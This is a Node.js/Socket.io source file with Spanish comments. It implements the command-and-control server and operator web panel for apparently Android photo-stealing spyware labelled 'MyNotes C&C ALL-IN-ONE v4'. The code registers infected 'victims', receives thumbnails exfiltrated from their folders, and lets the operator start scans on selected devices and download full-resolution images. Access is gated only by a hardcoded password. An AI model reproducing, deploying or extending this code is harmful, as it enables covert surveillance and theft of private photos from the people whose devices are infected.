const express = require('express');
const http = require('http');
const { Server } = require("socket.io");
const cors = require('cors');

const app = express();
app.use(cors());

// --- CONFIGURACIÓN ---
const AUTH_PASS = "admin123"; 
const PORT = process.env.PORT || 3000;

// --- INTERFAZ WEB ---
app.get('/', (req, res) => {
    if (req.query.auth !== AUTH_PASS) {
        return res.send(`<body style="background:black;color:red;display:flex;justify-content:center;align-items:center;height:100vh;"><h2>⛔ ACCESO DENEGADO</h2></body>`);
    }

    res.send(`
    <html>
        <head>
            <title>MyNotes C&C ALL-IN-ONE</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&display=swap" rel="stylesheet">
            <style>
                :root { --bg: #0d0d0d; --panel: #161616; --primary: #00e676; --accent: #2979ff; --warn: #ff9100; --danger: #ff1744; --text: #e0e0e0; }
                body { font-family: 'Roboto Mono', monospace; background: var(--bg); color: var(--text); margin: 0; padding: 0; height: 100vh; overflow: hidden; }
                
                .container { display: grid; grid-template-columns: 320px 1fr; height: 100%; }
                
                /* BARRA LATERAL */
                .sidebar { background: var(--panel); border-right: 1px solid #333; padding: 15px; display: flex; flex-direction: column; gap: 15px; overflow-y: auto; }
                .logo { color: var(--primary); font-size: 14px; font-weight: bold; border-bottom: 1px solid #333; padding-bottom: 10px; margin-bottom: 5px; }

                /* GRUPOS DE CONTROL */
                .control-group { background: #222; padding: 10px; border-radius: 6px; border: 1px solid #333; }
                .label { font-size: 10px; color: #888; text-transform: uppercase; margin-bottom: 5px; display:block; font-weight:bold; }
                
                select { width: 100%; padding: 8px; background: #000; border: 1px solid #444; color: white; border-radius: 4px; outline: none; font-family: inherit; font-size: 11px; }
                select:focus { border-color: var(--accent); }

                button { width: 100%; padding: 10px; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; margin-top: 5px; color: white; font-family: inherit; font-size: 11px; transition: 0.2s; }
                .btn-scan { background: var(--accent); }
                .btn-stop { background: var(--danger); }
                .btn-freeze { background: var(--warn); color: black; }
                .btn-freeze.active { background: #00bcd4; color: white; animation: pulse 2s infinite; }
                
                @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.7; } 100% { opacity: 1; } }

                /* ZONA DE FOTOS */
                .main-area { padding: 20px; overflow-y: auto; background: #0a0a0a; position: relative; }
                
                /* BARRA SUPERIOR ESTADÍSTICAS */
                .header-stats { 
                    position: sticky; top: 0; background: rgba(10,10,10,0.95); 
                    padding: 10px 15px; border-bottom: 1px solid #333; margin: -20px -20px 20px -20px; 
                    z-index: 10; display:flex; justify-content:space-between; font-size: 12px; backdrop-filter: blur(5px);
                }
                
                .grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 12px; padding-bottom: 50px; }
                
                .card { background: #1e1e1e; border-radius: 6px; overflow: hidden; border: 1px solid #333; position: relative; transition: 0.2s; }
                .card:hover { border-color: var(--accent); transform: translateY(-2px); }
                
                .card img { width: 100%; height: 140px; object-fit: cover; cursor: pointer; display: block; }
                
                .card-footer { padding: 8px; font-size: 10px; display: flex; justify-content: space-between; align-items: center; background: #1a1a1a; border-top: 1px solid #252525; }
                .btn-hd { background: transparent; border: 1px solid var(--primary); color: var(--primary); padding: 3px 8px; width: auto; margin: 0; }
                .btn-hd:hover { background: var(--primary); color: black; }

                .badge-victim { position: absolute; top: 5px; left: 5px; background: rgba(0,0,0,0.8); color: var(--accent); padding: 2px 6px; border-radius: 3px; font-size: 9px; font-weight:bold; }
                .badge-folder { position: absolute; top: 5px; right: 5px; background: rgba(0,0,0,0.8); color: #fff; padding: 2px 6px; border-radius: 3px; font-size: 9px; }

            </style>
        </head>
        <body>
            <div class="container">
                <div class="sidebar">
                    <div class="logo">☠️ C&C ALL-IN-ONE v4</div>

                    <div class="control-group">
                        <span class="label">1. OBJETIVO (TARGET)</span>
                        <select id="victimSelector" onchange="updateFilters()">
                            <option value="ALL">📢 TODOS LOS DISPOSITIVOS</option>
                        </select>
                    </div>

                    <div class="control-group">
                        <span class="label">2. FILTRO CARPETA</span>
                        <select id="folderSelector" onchange="updateFilters()">
                            <option value="ALL">📂 TODAS LAS CARPETAS</option>
                        </select>
                    </div>

                    <div class="control-group">
                        <span class="label">3. ACCIONES</span>
                        <button class="btn-scan" onclick="sendCommand('start')">▶ INICIAR ESCANEO</button>
                        <button class="btn-stop" onclick="sendCommand('stop')">⏹ DETENER ESCANEO</button>
                    </div>

                    <div class="control-group">
                        <span class="label">4. VISTA</span>
                        <button id="btnFreeze" class="btn-freeze" onclick="toggleFreeze()">👀 CONGELAR (PAUSA)</button>
                        <button style="background:#444;" onclick="clearGrid()">🗑 LIMPIAR PANTALLA</button>
                    </div>

                    <div style="margin-top:auto; font-size:10px; color:#555;">
                        <div id="connectionStatus">Esperando conexión...</div>
                    </div>
                </div>

                <div class="main-area">
                    <div class="header-stats">
                        <span>Filtro: <span id="filterLabel" style="color:white; font-weight:bold;">Ninguno</span></span>
                        <span>Fotos: <span id="count" style="color:var(--primary);">0</span></span>
                    </div>
                    <div class="grid" id="grid"></div>
                </div>
            </div>

            <script src="/socket.io/socket.io.js"></script>
            <script>
                const socket = io();
                
                // --- ESTADO DEL SISTEMA ---
                let victimsMap = {}; 
                let knownFolders = new Set();
                
                let isFrozen = false;
                let pendingBuffer = []; // Cola de fotos congeladas
                let photoCount = 0;

                // --- 1. GESTIÓN DE DISPOSITIVOS ---
                socket.on('update_device_list', (victims) => {
                    victimsMap = victims;
                    updateVictimSelect();
                    document.getElementById('connectionStatus').innerText = Object.keys(victims).length + " Dispositivos Online";
                    document.getElementById('connectionStatus').style.color = "#00e676";
                });

                function updateVictimSelect() {
                    const selector = document.getElementById('victimSelector');
                    const currentVal = selector.value;
                    let html = '<option value="ALL">📢 TODOS LOS DISPOSITIVOS (' + Object.keys(victimsMap).length + ')</option>';
                    
                    for (const [id, info] of Object.entries(victimsMap)) {
                        html += \`<option value="\${id}">📱 \${info.name}</option>\`;
                    }
                    selector.innerHTML = html;
                    selector.value = currentVal; 
                }

                // --- 2. LÓGICA DE FILTRADO UNIFICADA ---
                function updateFilters() {
                    const targetId = document.getElementById('victimSelector').value;
                    const targetFolder = document.getElementById('folderSelector').value;
                    const cards = document.getElementsByClassName('card');
                    
                    // Actualizar etiqueta superior
                    let label = (targetId === "ALL" ? "Todos" : victimsMap[targetId]?.name) + " / " + targetFolder;
                    document.getElementById('filterLabel').innerText = label;

                    // Loop para mostrar/ocultar
                    for (let card of cards) {
                        const owner = card.getAttribute('data-owner');
                        const folder = card.getAttribute('data-folder');
                        
                        const matchVictim = (targetId === "ALL" || owner === targetId);
                        const matchFolder = (targetFolder === "ALL" || folder === targetFolder);

                        if (matchVictim && matchFolder) {
                            card.style.display = "block";
                        } else {
                            card.style.display = "none";
                        }
                    }
                }

                // --- 3. FREEZE / PAUSA ---
                function toggleFreeze() {
                    isFrozen = !isFrozen;
                    const btn = document.getElementById('btnFreeze');
                    
                    if (isFrozen) {
                        btn.innerHTML = "⏸ PANTALLA CONGELADA";
                        btn.className = "btn-freeze active";
                    } else {
                        btn.innerHTML = "👀 CONGELAR (PAUSA)";
                        btn.className = "btn-freeze";
                        
                        // Procesar cola
                        if(pendingBuffer.length > 0) {
                            pendingBuffer.forEach(data => processNewImage(data));
                            pendingBuffer = [];
                        }
                    }
                }

                // --- 4. RECEPCIÓN DE FOTOS ---
                socket.on('new_preview', data => {
                    if (isFrozen) {
                        pendingBuffer.push(data);
                        document.getElementById('btnFreeze').innerHTML = "⏸ PENDIENTES: " + pendingBuffer.length;
                    } else {
                        processNewImage(data);
                    }
                });

                function processNewImage(data) {
                    // 1. Agregar carpeta si es nueva
                    if (!knownFolders.has(data.folder)) {
                        knownFolders.add(data.folder);
                        const opt = document.createElement('option');
                        opt.value = data.folder;
                        opt.innerText = "📂 " + data.folder;
                        document.getElementById('folderSelector').appendChild(opt);
                    }
                    
                    renderCard(data);
                }

                function renderCard(data) {
                    if(document.getElementById(data.path)) return;

                    const div = document.createElement('div');
                    div.className = 'card';
                    div.id = data.path;
                    
                    // Atributos para el filtrado
                    div.setAttribute('data-owner', data.victimId);
                    div.setAttribute('data-folder', data.folder);

                    const ownerName = victimsMap[data.victimId]?.name || "Desconocido";

                    div.innerHTML = \`
                        <div class="badge-victim">\${ownerName}</div>
                        <div class="badge-folder">\${data.folder}</div>
                        <img src="data:image/jpeg;base64,\${data.image64}" onclick="pedirHD('\${data.path}', '\${data.victimId}')" loading="lazy">
                        <div class="card-footer">
                            <span style="color:#666">\${data.path.split('/').pop().substring(0,10)}...</span>
                            <button class="btn-hd" onclick="pedirHD('\${data.path}', '\${data.victimId}')">⚡ HD</button>
                        </div>
                    \`;

                    // Verificar si debe mostrarse según filtros actuales
                    const targetId = document.getElementById('victimSelector').value;
                    const targetFolder = document.getElementById('folderSelector').value;
                    const matchVictim = (targetId === "ALL" || data.victimId === targetId);
                    const matchFolder = (targetFolder === "ALL" || data.folder === targetFolder);

                    if (!matchVictim || !matchFolder) {
                        div.style.display = "none";
                    }

                    document.getElementById('grid').prepend(div);
                    photoCount++;
                    document.getElementById('count').innerText = photoCount;
                }

                // --- 5. COMANDOS & HD ---
                function sendCommand(action) {
                    const target = document.getElementById('victimSelector').value;
                    const cmd = action === 'start' ? 'start_scan' : 'stop_scan';
                    socket.emit('admin_command', { action: cmd, target: target });
                }

                function pedirHD(path, targetId) {
                    console.log("⬇️ Solicitando HD a", targetId);
                    socket.emit('order_download', { path: path, target: targetId });
                }

                socket.on('receive_full', data => {
                    const a = document.createElement('a');
                    a.href = "data:image/jpeg;base64," + data.image64;
                    a.download = "HD_" + data.name;
                    document.body.appendChild(a);
                    a.click();
                    document.body.removeChild(a);

                    const card = document.getElementById(data.path);
                    if(card) {
                        card.style.border = "2px solid #00e676";
                        card.querySelector('.btn-hd').innerText = "✅";
                    }
                });

                function clearGrid() {
                    document.getElementById('grid').innerHTML = '';
                    photoCount = 0;
                    document.getElementById('count').innerText = '0';
                }

            </script>
        </body>
    </html>
    `);
});

const server = http.createServer(app);

// CONFIGURACIÓN PARA QUE FUNCIONE EN RENDER Y ANDROID
const io = new Server(server, { 
    cors: { origin: "*" }, 
    allowEIO3: true,         // Vital para compatibilidad
    maxHttpBufferSize: 1e8   // 100MB
});

let victims = {};

io.on('connection', (socket) => {
    
    console.log(`🔌 Conexión: ${socket.id}`);

    // RECEPCIÓN DE DATOS
    socket.on('usrData', (data) => {
        if (data.dataType === 'register_device') {
            victims[socket.id] = { name: data.deviceName, id: data.deviceId };
            console.log(`📱 REGISTRADO: ${data.deviceName}`);
            io.emit('update_device_list', victims);
        }
        else if (data.dataType === 'preview_image') {
            data.victimId = socket.id; // Pegar etiqueta de dueño
            socket.broadcast.emit('new_preview', data);
        }
        else if (data.dataType === 'full_image') {
            socket.broadcast.emit('receive_full', data);
        }
    });

    // COMANDOS DE ADMIN
    socket.on('admin_command', (cmd) => {
        console.log(`💻 CMD: ${cmd.action} -> ${cmd.target}`);
        if (cmd.target === 'ALL') {
            socket.broadcast.emit('command_' + cmd.action);
        } else {
            io.to(cmd.target).emit('command_' + cmd.action);
        }
    });

    // SOLICITUD DE DESCARGA
    socket.on('order_download', (data) => {
        if(data.target) {
            io.to(data.target).emit('request_full_image', { path: data.path });
        }
    });

    // DESCONEXIÓN
    socket.on('disconnect', () => {
        if (victims[socket.id]) {
            delete victims[socket.id];
            io.emit('update_device_list', victims);
        }
    });
    
    // ESTADO INICIAL
    socket.emit('update_device_list', victims);
});

server.listen(PORT, () => console.log(`🚀 SERVIDOR V4 LISTO EN PUERTO ${PORT}`));
